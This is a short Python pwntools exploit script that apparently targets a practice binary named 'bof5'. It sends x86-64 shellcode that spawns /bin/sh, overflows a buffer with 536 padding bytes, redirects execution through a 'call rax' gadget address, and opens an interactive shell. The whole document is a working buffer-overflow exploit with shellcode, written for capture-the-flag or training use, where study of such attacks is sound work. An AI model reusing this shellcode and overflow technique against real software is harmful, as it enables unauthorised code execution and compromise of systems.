from pwn import *

exe = ELF("./bof5")
r = process("./bof5")
shellcode = "\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
call_rax = 0x0000000000401014
#jump_rax = 0x000000000040110c

r.sendafter(b'name?', shellcode)
r.sendafter(b'> ', b'A' * 536 + p64(call_rax))
r.interactive()
